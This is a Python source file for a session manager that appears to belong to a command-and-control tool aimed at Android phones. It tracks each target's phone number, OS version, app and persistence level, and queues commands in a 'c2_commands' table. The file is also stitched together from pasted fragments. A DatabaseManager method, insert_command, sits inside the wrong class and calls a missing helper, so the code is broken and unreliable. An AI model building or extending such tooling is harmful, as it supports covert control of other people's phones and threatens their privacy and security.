import uuid
from core.database_manager import DatabaseManager
from datetime import datetime

class SessionManager:
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager

    def create_session(self, target_info: dict) -> str:
        session_id = str(uuid.uuid4())
        session_data = {
            'session_id': session_id,
            'target_phone': target_info.get('phone'),
            'target_os': target_info.get('android_version'),
            'target_app': target_info.get('target_app'),
            'status': 'active',
            'persistence_level': None,
            'created_at': datetime.now().isoformat()
        }
        self.db.insert_session(session_data)
        return session_id

    def get_session(self, session_id: str) -> dict:
        return self.db.get_session(session_id)

    def get_active_sessions(self) -> list:
        return self.db.get_active_sessions()

    def update_session(self, session_id: str, updates: dict):
        self.db.update_session(session_id, updates)

    def get_pending_commands(self, session_id):
        """Get pending commands for a session"""
        return self.db.get_pending_commands(session_id)

    def update_command_status(self, command_id, status):
        """Update command status"""
        return self.db.update_command_status(command_id, status)

    def add_command(self, session_id, command, args=None):
        """Add a command for a session"""
        return self.db.add_command(session_id, command, args)

    # Add these methods to SessionManager class in core/session_manager.py

    def get_total_sessions(self):
        """Get total number of sessions"""
        return self.db.get_total_sessions()

    def get_expired_sessions(self):
        """Get expired sessions"""
        return self.db.get_expired_sessions()

    def remove_session(self, session_id):
        """Remove a session"""
        return self.db.remove_session(session_id)

# Also add this method to DatabaseManager
    def insert_command(self, command_data):
        """Insert a command into the database"""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO c2_commands (session_id, command, status, created_at)
                VALUES (?, ?, ?, ?)
            ''', (
                command_data['session_id'],
                command_data['command'],
                command_data['status'],
                command_data['created_at']
            ))
            conn.commit()
            return cursor.lastrowid
